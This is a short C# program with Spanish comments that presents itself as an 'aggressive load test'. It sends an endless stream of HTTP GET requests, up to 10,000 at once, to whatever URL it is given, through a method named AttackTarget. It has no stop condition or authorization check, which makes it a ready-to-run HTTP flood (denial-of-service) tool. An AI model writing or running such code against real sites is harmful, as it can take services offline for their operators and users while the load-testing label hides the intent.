using System;
using System.Net.Http;
using System.Threading;
using System.Threading.Tasks;

class Program
{
    static readonly HttpClient client = new HttpClient();
    // Limitar el número de tareas paralelas para un control efectivo.
    const int maxDegreeOfParallelism = 10000; // Ajusta según capacidad.
    static SemaphoreSlim semaphore = new SemaphoreSlim(maxDegreeOfParallelism);

static async Task Main(string[] args)
{
    if (args.Length == 0)
    {
        Console.WriteLine("aPor favor, especifique una URL como argumento.");
        return;
    }

    string targetUrl = args[0]; // Usa el primer argumento como la URL
    Console.WriteLine($"Iniciando pruebas de carga agresivas en {targetUrl}...");

    while (true)
    {
        await semaphore.WaitAsync();
        _ = AttackTarget(targetUrl);
    }
}


    static async Task AttackTarget(string url)
    {
        try
        {
            // Introduce un retraso opcional para simular un patrón de tráfico más realista.
            await Task.Delay(TimeSpan.FromMilliseconds(50)); // Ajusta según sea necesario.
            HttpResponseMessage response = await client.GetAsync(url);
            response.EnsureSuccessStatusCode();
        }
        catch (Exception e)
        {
            Console.WriteLine($"\nExcepción encontrada: {e.Message}");
            // Considera implementar una lógica de reintento aquí.
        }
        finally
        {
            semaphore.Release();
        }
    }
}

